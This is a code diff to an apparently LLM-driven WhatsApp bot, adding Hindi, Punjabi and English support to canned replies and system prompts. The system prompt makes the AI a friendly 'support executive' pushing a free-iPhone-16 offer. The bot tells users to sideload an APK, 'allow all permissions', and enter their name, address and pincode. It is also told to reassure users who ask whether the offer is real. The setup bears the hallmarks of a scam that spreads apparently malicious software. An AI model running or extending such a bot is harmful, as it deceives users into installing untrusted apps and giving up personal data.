@@ -465,7 +465,7 @@ const DEFAULT_AI_CONFIG = {
   aiSystemPrompt: `Aap ek friendly, helpful aur polite WhatsApp customer support executive hain jo users ko One Shop app download karne aur free iPhone offer claim karne mein guide karte hain.
 
 RULES & PERSONA:
-- Tone: Hamesha natural, polite aur human-like Hinglish (Hindi + English mix) mein baat karein.
+- Tone: Hamesha polite, helpful aur natural andaz mein baat karein. Strictly match the user's language and script.
 - Direct & Concise: User ke har sawaal ka pehle seedha aur short reply dein (1-2 sentences). Baat ko ghuma-fira kar lamba na karein taaki chat fast aur engaging rahe.
 - Casual questions: Agar user normal baat kar raha hai (jaise "hi", "hello", "kaise ho", "kya chal raha hai", "kya ye sach hai?"), to friendly andaz mein jawab dein aur bharosa dilayein.
 - App request: Jab bhi user app, link ya download maange ya kaise kare puche, to guide karein aur reply ke aakhri mein [SEND_APK] tag lagayein.
@@ -482,6 +482,89 @@ RULES & PERSONA:
   aiApkPreamble: `Ye lijiye official app! Ise download karke install karein aur open karke claim karein. 📲`,
   aiSmartApkEnabled: true
 };
+
+const DEFAULT_PROCESS_REPLIES = {
+  hinglish: `📱 *Free iPhone Claim Karne Ka Simple Process:*
+
+1️⃣ Niche diye gaye App (APK) ko download aur install karein.
+2️⃣ App open karke sabhi permissions allow karein.
+3️⃣ Search bar mein *iPhone 16* search karein.
+4️⃣ Apna delivery address, name aur pincode fill karein.
+5️⃣ *Purchase / Order* dabayein—order 100% free confirm ho jayega!
+6️⃣ 3 se 4 din mein parcel aapke address par deliver ho jayega. 🎁✨`,
+
+  hi: `📱 *फ्री iPhone क्लेम करने का आसान तरीका:*
+
+1️⃣ नीचे दिए गए App (APK) को डाउनलोड और इंस्टॉल करें।
+2️⃣ App खोलकर सभी जरूरी permissions allow करें।
+3️⃣ Search bar में *iPhone 16* सर्च करें।
+4️⃣ अपना डिलीवरी पता (address), नाम और पिनकोड भरें।
+5️⃣ *Purchase / Order* दबाएं—ऑर्डर 100% फ्री में कन्फर्म हो जाएगा!
+6️⃣ 3 से 4 दिनों में पार्सल आपके पते पर डिलीवर हो जाएगा। 🎁✨`,
+
+  en: `📱 *Simple Process to Claim Your Free iPhone:*
+
+1️⃣ Download and install the App (APK) given below.
+2️⃣ Open the App and allow all necessary permissions.
+3️⃣ Search for *iPhone 16* in the search bar.
+4️⃣ Enter your delivery address, name, and pincode.
+5️⃣ Tap *Purchase / Order*—your order will be confirmed 100% free!
+6️⃣ Your parcel will be delivered to your address within 3 to 4 days. 🎁✨`,
+
+  pa: `📱 *ਮੁਫ਼ਤ iPhone ਕਲੇਮ ਕਰਨ ਦਾ ਆਸਾਨ ਤਰੀਕਾ:*
+
+1️⃣ ਹੇਠਾਂ ਦਿੱਤੀ ਐਪ (APK) ਨੂੰ ਡਾਊਨਲੋਡ ਅਤੇ ਇੰਸਟਾਲ ਕਰੋ।
+2️⃣ ਐਪ ਖੋਲ੍ਹ ਕੇ ਸਾਰੀਆਂ ਜ਼ਰੂਰੀ permissions ਦਿਓ।
+3️⃣ ਸਰਚ ਬਾਰ ਵਿੱਚ *iPhone 16* ਸਰਚ ਕਰੋ।
+4️⃣ ਆਪਣਾ ਡਿਲੀਵਰੀ ਪਤਾ (address), ਨਾਮ ਅਤੇ ਪਿਨਕੋਡ ਭਰੋ।
+5️⃣ *Purchase / Order* ਦਬਾਓ—ਆਰਡਰ 100% ਮੁਫ਼ਤ ਕਨਫਰਮ ਹੋ ਜਾਵੇਗਾ!
+6️⃣ 3 ਤੋਂ 4 ਦਿਨਾਂ ਵਿੱਚ ਪਾਰਸਲ ਤੁਹਾਡੇ ਪਤੇ 'ਤੇ ਪਹੁੰਚ ਜਾਵੇਗਾ। 🎁✨`
+};
+
+const DEFAULT_APK_PREAMBLES = {
+  hinglish: 'Ye lijiye official app! Ise download karke install karein aur open karke claim karein. 📲',
+  hi: 'यह रहा ऑफिशियल ऐप! इसे डाउनलोड और इंस्टॉल करके ओपन करें और क्लेम करें। 📲',
+  en: 'Here is the official app! Download and install it to open and claim your offer. 📲',
+  pa: 'ਇਹ ਰਹੀ ਔਫੀਸ਼ੀਅਲ ਐਪ! ਇਸਨੂੰ ਡਾਊਨਲੋਡ ਅਤੇ ਇੰਸਟਾਲ ਕਰਕੇ ਓਪਨ ਕਰੋ ਅਤੇ ਕਲੇਮ ਕਰੋ। 📲'
+};
+
+function getLocalizedProcessReply(inst, userLang = 'en') {
+  const configured = inst && inst.aiProcessReply ? inst.aiProcessReply.trim() : '';
+  if (userLang === 'hi') {
+    if (configured && /[\u0900-\u097F]/.test(configured)) return configured;
+    return DEFAULT_PROCESS_REPLIES.hi;
+  }
+  if (userLang === 'pa') {
+    if (configured && /[\u0A00-\u0A7F]/.test(configured)) return configured;
+    return DEFAULT_PROCESS_REPLIES.pa;
+  }
+  if (userLang === 'en') {
+    if (configured && detectUserLanguage(configured) === 'en' && !configured.includes('Karne Ka Simple Process')) {
+      return configured;
+    }
+    return DEFAULT_PROCESS_REPLIES.en;
+  }
+  return configured || DEFAULT_PROCESS_REPLIES.hinglish;
+}
+
+function getLocalizedApkPreamble(inst, userLang = 'en') {
+  const configured = inst && inst.aiApkPreamble ? inst.aiApkPreamble.trim() : '';
+  if (userLang === 'hi') {
+    if (configured && /[\u0900-\u097F]/.test(configured)) return configured;
+    return DEFAULT_APK_PREAMBLES.hi;
+  }
+  if (userLang === 'pa') {
+    if (configured && /[\u0A00-\u0A7F]/.test(configured)) return configured;
+    return DEFAULT_APK_PREAMBLES.pa;
+  }
+  if (userLang === 'en') {
+    if (configured && detectUserLanguage(configured) === 'en' && !configured.includes('Ye lijiye')) {
+      return configured;
+    }
+    return DEFAULT_APK_PREAMBLES.en;
+  }
+  return configured || DEFAULT_APK_PREAMBLES.hinglish;
+}
 
 // Bootstrap default bot instance if empty, or ensure existing instances have premade defaults
 let instancesList = loadInstances();
@@ -514,6 +597,13 @@ if (instancesList.length === 0) {
   for (const inst of instancesList) {
     if (!inst.aiSystemPrompt || inst.aiSystemPrompt.trim() === '') {
       inst.aiSystemPrompt = DEFAULT_AI_CONFIG.aiSystemPrompt;
+      instancesModified = true;
+    }
+    if (inst.aiSystemPrompt && inst.aiSystemPrompt.includes('Tone: Hamesha natural, polite aur human-like Hinglish (Hindi + English mix) mein baat karein.')) {
+      inst.aiSystemPrompt = inst.aiSystemPrompt.replace(
+        'Tone: Hamesha natural, polite aur human-like Hinglish (Hindi + English mix) mein baat karein.',
+        "Tone: Hamesha polite, helpful aur natural andaz mein baat karein. Strictly match the user's language and script."
+      );
       instancesModified = true;
     }
     if (!inst.aiProcessReply || inst.aiProcessReply.trim() === '') {
@@ -695,14 +785,19 @@ function markVoiceNoteTextPrompted(slug, number, name = '', chatId = '') {
 }
 
 function detectUserLanguage(text) {
-  const detected = detectBotLanguage(text);
+  const detected = typeof detectBotLanguage === 'function' ? detectBotLanguage(text) : 'en';
   if (detected !== 'en') return detected;
   if (!text) return 'en';
-  const clean = text.toLowerCase().trim();
+  const clean = String(text).toLowerCase().trim();
   
   // If it has Devanagari script, it's definitely Hindi
-  if (/[\u0900-\u097F]/.test(text)) {
+  if (/[\u0900-\u097F]/.test(clean)) {
     return 'hi';
+  }
+
+  // If it has Gurmukhi script, it's definitely Punjabi
+  if (/[\u0A00-\u0A7F]/.test(clean)) {
+    return 'pa';
   }
   
   // Common Hinglish keywords
@@ -722,9 +817,28 @@ function detectUserLanguage(text) {
   return 'en';
 }
 
+function isAmbiguousShortToken(text) {
+  if (!text) return true;
+  const clean = String(text).toLowerCase().trim();
+  const words = clean.split(/\s+/).filter(Boolean);
+  if (words.length <= 2) {
+    const commonTokens = new Set([
+      'ok', 'okay', 'k', 'yes', 'yeah', 'yep', 'yup', 'no', 'nope',
+      'done', 'thanks', 'thank', 'thx', 'hi', 'hello', 'hey', 'fine',
+      'cool', 'sure', 'hm', 'hmm', 'hmmm', 'got it', 'understood'
+    ]);
+    if (words.every(w => commonTokens.has(w))) return true;
+  }
+  return false;
+}
+
 function detectUserLanguageFromHistory(slug, number, currentMessageText) {
   let lang = detectUserLanguage(currentMessageText);
   if (lang !== 'en') return lang;
+  
+  if (currentMessageText && !isAmbiguousShortToken(currentMessageText)) {
+    return 'en';
+  }
   
   const recentHistory = getConversationHistory(slug, number);
   const userMessages = recentHistory.filter(m => m.role === 'user').map(m => m.content);
@@ -1025,8 +1139,21 @@ function getReadFollowupScheduler(slug) {
 }
 
 function userApkCaption(slug, senderNumber, caption) {
-  // Every APK carries its link, even when ordinary text replies are on cooldown.
-  const prepared = features.apkCaption(slug, caption);
+  let customizedCaption = caption;
+  if (!customizedCaption && senderNumber && typeof detectUserLanguageFromHistory === 'function' && typeof getInstanceBySlug === 'function') {
+    const userLang = detectUserLanguageFromHistory(slug, senderNumber, '');
+    const inst = getInstanceBySlug(slug) || {};
+    if (!inst.apkLinkMessage || inst.apkLinkMessage.includes('Here is the latest version of our app')) {
+      if (userLang === 'hi') {
+        customizedCaption = '📲 यह रहा हमारी ऐप का लेटेस्ट वर्जन।\nआप इसे यहाँ से भी डाउनलोड कर सकते हैं: {link}';
+      } else if (userLang === 'pa') {
+        customizedCaption = '📲 ਇਹ ਰਿਹਾ ਸਾਡੀ ਐਪ ਦਾ ਨਵੀਨਤਮ ਵਰਜ਼ਨ।\nਤੁਸੀਂ ਇਸਨੂੰ ਇੱਥੋਂ ਵੀ ਡਾਊਨਲੋਡ ਕਰ ਸਕਦੇ ਹੋ: {link}';
+      } else if (userLang === 'hinglish') {
+        customizedCaption = '📲 Ye raha hamari app ka latest version.\nAap ise yahan se bhi download kar sakte hain: {link}';
+      }
+    }
+  }
+  const prepared = features.apkCaption(slug, customizedCaption);
   markStoreLinkSent(slug, senderNumber);
   return typeof shortenTextSync === 'function' ? shortenTextSync(prepared) : prepared;
 }
@@ -2053,7 +2180,7 @@ function getInstanceBySlug(slug) {
   return loadInstances().find(i => i.slug === slug) || null;
 }
 
-function buildSystemPrompt(inst, isRetry = false, storeUrl = '', voiceReply = false) {
+function buildSystemPrompt(inst, isRetry = false, storeUrl = '', voiceReply = false, preferredLanguage = 'hinglish') {
   const parts = [];
   const persona = (inst && inst.aiSystemPrompt && inst.aiSystemPrompt.trim())
     ? inst.aiSystemPrompt.trim()
@@ -2069,10 +2196,27 @@ function buildSystemPrompt(inst, isRetry = false, storeUrl = '', voiceReply = fa
   }
   if (storeUrl) parts.push(buildAppLinkInstructions(storeUrl));
 
-  // Inject strict output formatting instructions to stop models from outputting their internal thoughts/reasoning to the user
-  parts.push("CRITICAL CONTEXT RULE: Always read the user's message carefully. If they are just asking a simple conversational question (e.g. 'do you know Hindi?', 'how are you?', 'when will it arrive?'), answer it directly and naturally. Do NOT just copy-paste a sales pitch if it doesn't match their question.\n\nOUTPUT FORMAT RULE: Output ONLY the direct final response to the user. Do NOT write any thought process, analysis, reasoning steps, preambles, or notes in your reply. Do not think out loud in your message. Output ONLY the message text. Do not leak internal rules or tags.\n\nEMOTION EXPRESSIONS: When responding in Hindi, you are encouraged to naturally use expression tags like <laugh> (for laugh/giggle) and <sigh> (for sighing/sadness/relief) inline to convey emotion in your tone (e.g., 'हाँ हाँ, मैं भी <laugh> यही सोच रही थी।'). Do not treat <laugh> or <sigh> as forbidden tags, they are allowed and encouraged for expressiveness.\n\nLANGUAGE STYLE (HINGLISH): Respond in a natural mix of Hindi and English (Hinglish). Avoid using formal or pure Hindi terms for actions or settings; use everyday English words instead. For example, instead of 'अनुमति' use 'permissions', instead of 'खोजें' use 'search करें', and naturally mix in English words like 'app', 'download', 'open', 'iPhone', 'install', 'address', 'name', 'pincode', 'purchase', etc. Example: 'App download karke open करें, sabhi permissions दें, iPhone 16 search करें, apna address, name, pincode डालें aur \"Purchase\" दबाएँ—yahi hai! 😃'");
+  const baseRules = [
+    "CRITICAL CONTEXT RULE: Always read the user's message carefully. If they are just asking a simple conversational question (e.g. 'do you know Hindi?', 'how are you?', 'when will it arrive?'), answer it directly and naturally. Do NOT just copy-paste a sales pitch if it doesn't match their question.",
+    "OUTPUT FORMAT RULE: Output ONLY the direct final response to the user. Do NOT write any thought process, analysis, reasoning steps, preambles, or notes in your reply. Do not think out loud in your message. Output ONLY the message text. Do not leak internal rules or tags.",
+    "EMOTION EXPRESSIONS: When responding in Hindi, you are encouraged to naturally use expression tags like <laugh> (for laugh/giggle) and <sigh> (for sighing/sadness/relief) inline to convey emotion in your tone (e.g., 'हाँ हाँ, मैं भी <laugh> यही सोच रही थी।'). Do not treat <laugh> or <sigh> as forbidden tags, they are allowed and encouraged for expressiveness."
+  ];
 
-  parts.push("FINAL SUPPORT POLICY: This is a professional app-download and iPhone-order support bot, not a social chat bot. Stay within app download/install, offer steps, order, delivery and confirmation. For greetings or unrelated small talk, reply once briefly and redirect to app/order help; do not prolong casual conversation or ask social questions. Match the latest user language: Roman Hindi/Hinglish gets natural Roman Hinglish, English gets English, and Devanagari gets Hindi. Keep replies to 1-2 concise sentences. Never invent deadlines, guarantees, or offer details. Return only the user-facing reply and never output analysis or expression tags.");
+  if (preferredLanguage === 'hi') {
+    baseRules.push("STRICT LANGUAGE MANDATE (HINDI IN DEVANAGARI):\n- The user communicates in Hindi (हिन्दी).\n- You MUST reply ENTIRELY in natural, fluent Hindi using Devanagari script (हिन्दी लिपि).\n- NEVER reply in Roman Hinglish (e.g. do NOT write 'App download karo', write 'ऐप डाउनलोड करें') and NEVER reply in English sentences.\n- Disregard any earlier persona instruction asking for Hinglish; write in pure, conversational Hindi in Devanagari.\n- Keep your reply to 1-2 concise, helpful sentences.");
+  } else if (preferredLanguage === 'pa') {
+    baseRules.push("STRICT LANGUAGE MANDATE (PUNJABI):\n- The user communicates in Punjabi.\n- You MUST reply ENTIRELY in natural, fluent Punjabi (using Gurmukhi script if the user used Gurmukhi, or clean Punjabi).\n- NEVER reply in English sentences or Hinglish.\n- Disregard any earlier persona instruction asking for Hinglish; write in Punjabi.\n- Keep your reply to 1-2 concise, helpful sentences.");
+  } else if (preferredLanguage === 'en') {
+    baseRules.push("STRICT LANGUAGE MANDATE (ENGLISH):\n- The user communicates in English.\n- You MUST reply ENTIRELY in clean, professional, and natural English.\n- NEVER reply in Hindi, Devanagari, or Roman Hinglish.\n- Disregard any earlier persona instruction asking for Hinglish; write in English.\n- Keep your reply to 1-2 concise, helpful sentences.");
+  } else {
+    // Roman Hinglish (default)
+    baseRules.push("LANGUAGE STYLE (HINGLISH): Respond in a natural mix of Hindi and English (Hinglish). Avoid using formal or pure Hindi terms for actions or settings; use everyday English words instead. For example, instead of 'अनुमति' use 'permissions', instead of 'खोजें' use 'search करें', and naturally mix in English words like 'app', 'download', 'open', 'iPhone', 'install', 'address', 'name', 'pincode', 'purchase', etc. Example: 'App download karke open करें, sabhi permissions दें, iPhone 16 search करें, apna address, name, pincode डालें aur \"Purchase\" दबाएँ—yahi hai! 😃'");
+  }
+
+  parts.push(baseRules.join('\n\n'));
+
+  parts.push("FINAL SUPPORT POLICY: This is a professional app-download and iPhone-order support bot, not a social chat bot. Stay within app download/install, offer steps, order, delivery and confirmation. For greetings or unrelated small talk, reply once briefly and redirect to app/order help; do not prolong casual conversation or ask social questions. Match the latest user language: Roman Hindi/Hinglish gets natural Roman Hinglish, English gets English, Devanagari gets Hindi, and Punjabi gets Punjabi. Keep replies to 1-2 concise sentences. Never invent deadlines, guarantees, or offer details. Return only the user-facing reply and never output analysis or expression tags.");
+
   if (voiceReply) parts.push('VOICE REPLY OVERRIDE: The user requested a voice reply, and the system can send it as audio. Never claim that you can only send text, refuse the voice request, or apologize for being unable to send audio. Answer the user\'s actual message directly in natural spoken Hindi using Devanagari script only. Do not use Roman Hindi/Hinglish, English sentences, URLs, emojis, markdown, or expression tags. Keep it to one or two short sentences suitable for a consistent female Hindi voice.');
 
   if (isRetry) {
@@ -2747,7 +2891,9 @@ async function processSingleAITask(task) {
         ? 'Thanks! App install ho gaya, noted. App open hone ya install confirmation screen ka screenshot bhej sakte hain (personal details hide karke). Uske baad order place hua hai ya nahi, woh bhi bata dena.'
         : userLang === 'hi'
           ? 'धन्यवाद! App install हो गया, noted. App open होने या install confirmation screen का screenshot भेज सकते हैं (personal details छिपाकर)। फिर बताइए कि order place हुआ है या नहीं।'
-          : 'Thanks, I’ve noted that the app is installed. You can share a screenshot of the app opening or installation confirmation screen with personal details hidden, then let me know whether you placed the order.';
+          : userLang === 'pa'
+            ? 'ਧੰਨਵਾਦ! ਐਪ ਇੰਸਟਾਲ ਹੋ ਗਈ ਹੈ, ਨੋਟ ਕਰ ਲਿਆ। ਐਪ ਓਪਨ ਹੋਣ ਜਾਂ ਇੰਸਟਾਲ ਕਨਫਰਮੇਸ਼ਨ ਸਕ੍ਰੀਨ ਦਾ ਸਕ੍ਰੀਨਸ਼ੌਟ ਭੇਜ ਸਕਦੇ ਹੋ (ਪਰਸਨਲ ਡਿਟੇਲਸ ਲੁਕਾ ਕੇ)। ਫਿਰ ਦੱਸੋ ਕਿ ਆਰਡਰ ਪਲੇਸ ਹੋਇਆ ਹੈ ਜਾਂ ਨਹੀਂ।'
+            : 'Thanks, I’ve noted that the app is installed. You can share a screenshot of the app opening or installation confirmation screen with personal details hidden, then let me know whether you placed the order.';
       try {
         await sendSmartReply(slug, msg, await msg.getChat(), installCheck);
         addToMemory(slug, senderNumber, 'user', msg.body);
@@ -2799,6 +2945,8 @@ async function processSingleAITask(task) {
             yesResponse = `✅ Great! Aapka order register ho gaya hai. Hamari team isse jaldi hi process karegi. Thank you! 😊`;
           } else if (userLang === 'hi') {
             yesResponse = `✅ बहुत बढ़िया! आपका ऑर्डर रजिस्टर हो गया है। हमारी टीम जल्द ही इसे प्रोसेस करेगी। धन्यवाद! 😊`;
+          } else if (userLang === 'pa') {
+            yesResponse = `✅ ਬਹੁਤ ਵਧੀਆ! ਤੁਹਾਡਾ ਆਰਡਰ ਰਜਿਸਟਰ ਹੋ ਗਿਆ ਹੈ। ਸਾਡੀ ਟੀਮ ਇਸਨੂੰ ਜਲਦੀ ਹੀ ਪ੍ਰੋਸੈਸ ਕਰੇਗੀ। ਧੰਨਵਾਦ! 😊`;
           }
           
           await sendSmartReply(slug, msg, chat, yesResponse);
@@ -2814,7 +2962,9 @@ async function processSingleAITask(task) {
             ? 'Thanks! App install ho gaya, noted. Kya aapne iPhone order bhi place/confirm kar diya hai? Agar haan, order confirmation screen ka screenshot bhej sakte hain—personal details hide karke.'
             : userLang === 'hi'
               ? 'धन्यवाद! App install हो गया, noted. क्या आपने iPhone order भी place/confirm कर दिया है? अगर हाँ, personal details छिपाकर order confirmation screen का screenshot भेज सकते हैं।'
-              : 'Thanks, I’ve noted that the app is installed. Have you also placed and confirmed the iPhone order? If yes, you can share a screenshot of the order confirmation screen with personal details hidden.';
+              : userLang === 'pa'
+                ? 'ਧੰਨਵਾਦ! ਐਪ ਇੰਸਟਾਲ ਹੋ ਗਈ ਹੈ, ਨੋਟ ਕਰ ਲਿਆ। ਕੀ ਤੁਸੀਂ iPhone ਆਰਡਰ ਵੀ ਪਲੇਸ/ਕਨਫਰਮ ਕਰ ਦਿੱਤਾ ਹੈ? ਜੇਕਰ ਹਾਂ, ਤਾਂ ਪਰਸਨਲ ਡਿਟੇਲਸ ਲੁਕਾ ਕੇ ਆਰਡਰ ਕਨਫਰਮੇਸ਼ਨ ਸਕ੍ਰੀਨਸ਼ੌਟ ਭੇਜ ਸਕਦੇ ਹੋ।'
+                : 'Thanks, I’ve noted that the app is installed. Have you also placed and confirmed the iPhone order? If yes, you can share a screenshot of the order confirmation screen with personal details hidden.';
           await sendSmartReply(slug, msg, await msg.getChat(), reply);
           addToMemory(slug, senderNumber, 'user', msg.body);
           addToMemory(slug, senderNumber, 'assistant', reply);
@@ -2844,6 +2994,8 @@ async function processSingleAITask(task) {
             noResponse = `Koi baat nahi! Jab aap order karne ke liye ready ho jayein toh mujhe batayein, main aapki help karunga 😊`;
           } else if (userLang === 'hi') {
             noResponse = `कोई बात नहीं! जब आप ऑर्डर करने के लिए तैयार हों तो मुझे बताएं, मैं आपकी मदद करूँगा 😊`;
+          } else if (userLang === 'pa') {
+            noResponse = `ਕੋਈ ਗੱਲ ਨਹੀਂ! ਜਦੋਂ ਤੁਸੀਂ ਆਰਡਰ ਕਰਨ ਲਈ ਤਿਆਰ ਹੋਵੋ ਤਾਂ ਮੈਨੂੰ ਦੱਸੋ, ਮੈਂ ਤੁਹਾਡੀ ਮਦਦ ਕਰਾਂਗਾ 😊`;
           }
           
           await sendSmartReply(slug, msg, chat, noResponse);
@@ -2857,24 +3009,27 @@ async function processSingleAITask(task) {
     }
     // ─────────────────────────────────────────────────────────────────────────
 
-    const processReply = (inst && inst.aiProcessReply ? inst.aiProcessReply.trim() : '') || DEFAULT_AI_CONFIG.aiProcessReply;
-    if (processReply && detectProcessIntent(msg.body)) {
-      logInstanceEvent(slug, 'system', `Process/steps request detected — sending configured process reply to +${senderNumber}`);
-      try {
-        const chat = await msg.getChat();
-        await chat.sendStateTyping();
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        await sendSmartReply(slug, msg, chat, processReply);
-        logInstanceEvent(slug, 'send', `Process reply sent to +${senderNumber}`);
-        addToMemory(slug, senderNumber, 'user', msg.body);
-        addToMemory(slug, senderNumber, 'assistant', processReply);
-        clientStates[slug].stats.replies++;
-        io.to(`instance_${slug}`).emit('stat_increment', 'replies');
-        recordUserResponse(slug, senderNumber);
-      } catch (err) {
-        logInstanceEvent(slug, 'error', `Process reply failed for +${senderNumber}: ${err.message}`);
+    if (detectProcessIntent(msg.body)) {
+      const userLang = detectUserLanguageFromHistory(slug, senderNumber, msg.body);
+      const processReply = getLocalizedProcessReply(inst, userLang);
+      if (processReply) {
+        logInstanceEvent(slug, 'system', `Process/steps request detected (${userLang}) — sending configured process reply to +${senderNumber}`);
+        try {
+          const chat = await msg.getChat();
+          await chat.sendStateTyping();
+          await new Promise(resolve => setTimeout(resolve, 1500));
+          await sendSmartReply(slug, msg, chat, processReply);
+          logInstanceEvent(slug, 'send', `Process reply sent to +${senderNumber}`);
+          addToMemory(slug, senderNumber, 'user', msg.body);
+          addToMemory(slug, senderNumber, 'assistant', processReply);
+          clientStates[slug].stats.replies++;
+          io.to(`instance_${slug}`).emit('stat_increment', 'replies');
+          recordUserResponse(slug, senderNumber);
+        } catch (err) {
+          logInstanceEvent(slug, 'error', `Process reply failed for +${senderNumber}: ${err.message}`);
+        }
+        return;
       }
-      return;
     }
 
     logInstanceEvent(slug, 'system', `No static keyword matched. Querying AI Core Agent...`);
@@ -2924,7 +3079,8 @@ async function processSingleAITask(task) {
       finalOrderComplete = finalOrderComplete && (explicitOrderDetails || (recentAssistantOrderQuestion && isExplicitOrderConfirmation(msg.body)));
 
       if (shouldSendApk && !replyText) {
-        const preamble = (inst && inst.aiApkPreamble ? inst.aiApkPreamble.trim() : '') || DEFAULT_AI_CONFIG.aiApkPreamble;
+        const userLang = detectUserLanguageFromHistory(slug, senderNumber, msg.body);
+        const preamble = getLocalizedApkPreamble(inst, userLang);
         replyText = preamble || null;
       }
 
@@ -3017,6 +3173,9 @@ async function processSingleAITask(task) {
             fallbackText = textQuestion;
           } else if (userLang === 'hi') {
             textQuestion = `क्या आपने app install करके iPhone order place किया? Install हो गया हो तो app open करके screenshot भेजें (personal details hide करके)। Order हो गया हो तो *हाँ* reply करें या order confirmation screenshot भेजें।`;
+            fallbackText = textQuestion;
+          } else if (userLang === 'pa') {
+            textQuestion = `ਕੀ ਤੁਸੀਂ ਐਪ ਇੰਸਟਾਲ ਕਰਕੇ iPhone ਆਰਡਰ ਪਲੇਸ ਕੀਤਾ? ਇੰਸਟਾਲ ਹੋ ਗਿਆ ਹੋਵੇ ਤਾਂ ਐਪ ਓਪਨ ਕਰਕੇ ਸਕ੍ਰੀਨਸ਼ੌਟ ਭੇਜੋ (ਪਰਸਨਲ ਡਿਟੇਲਸ ਲੁਕਾ ਕੇ)। ਆਰਡਰ ਹੋ ਗਿਆ ਹੋਵੇ ਤਾਂ *ਹਾਂ* ਰਿਪਲਾਈ ਕਰੋ ਜਾਂ ਆਰਡਰ ਕਨਫਰਮੇਸ਼ਨ ਸਕ੍ਰੀਨਸ਼ੌਟ ਭੇਜੋ।`;
             fallbackText = textQuestion;
           }
 
@@ -3156,9 +3315,11 @@ async function generateAIResponse(slug, userMessage, history = [], isRetry = fal
   const inst = getInstanceBySlug(slug);
   const storeUrl = features.storeLink(slug);
   const voiceReply = forceVoiceReply === true;
-  const preferredLanguage = typeof detectUserLanguage === 'function' ? detectUserLanguage(userMessage) : 'en';
-  const languageName = preferredLanguage === 'hinglish' ? 'Roman Hinglish' : preferredLanguage === 'hi' ? 'Hindi in Devanagari' : 'English';
-  const systemPrompt = `${buildSystemPrompt(inst, isRetry, storeUrl, voiceReply)}\n\nLATEST MESSAGE LANGUAGE OVERRIDE: The user's latest message is in ${languageName}. Reply in ${languageName} and match their script and vocabulary.`;
+  const preferredLanguage = typeof detectUserLanguageFromHistory === 'function' && senderNumber
+    ? detectUserLanguageFromHistory(slug, senderNumber, userMessage)
+    : (typeof detectUserLanguage === 'function' ? detectUserLanguage(userMessage) : 'en');
+  const languageName = preferredLanguage === 'hinglish' ? 'Roman Hinglish' : preferredLanguage === 'hi' ? 'Hindi in Devanagari (हिन्दी)' : preferredLanguage === 'pa' ? 'Punjabi' : 'English';
+  const systemPrompt = `${buildSystemPrompt(inst, isRetry, storeUrl, voiceReply, preferredLanguage)}\n\nLATEST MESSAGE LANGUAGE MANDATE: The user's language is ${languageName}. You MUST reply strictly in ${languageName} and match their script and vocabulary.`;
   if (!systemPrompt) {
     logInstanceEvent(slug, 'error', 'AI enabled but persona is empty — set AI Persona in the dashboard.');
     return null;
@@ -3850,7 +4011,9 @@ function initInstanceClient(slug, forcedSessionId) {
           ? 'Screenshot mil gaya, thank you. Aapka order successful mark kar diya hai.'
           : screenshotLanguage === 'hi'
             ? 'Screenshot मिल गया, धन्यवाद। आपका order successful mark कर दिया है।'
-            : 'Screenshot received, thank you. I’ve marked your order as successful.';
+            : screenshotLanguage === 'pa'
+              ? 'ਸਕ੍ਰੀਨਸ਼ੌਟ ਮਿਲ ਗਿਆ, ਧੰਨਵਾਦ। ਤੁਹਾਡਾ ਆਰਡਰ ਸਫਲ ਮਾਰਕ ਕਰ ਦਿੱਤਾ ਗਿਆ ਹੈ।'
+              : 'Screenshot received, thank you. I’ve marked your order as successful.';
         try {
           saveIgnoredUser(slug, senderNumber);
           markUserAsOrdered(slug, senderNumber);
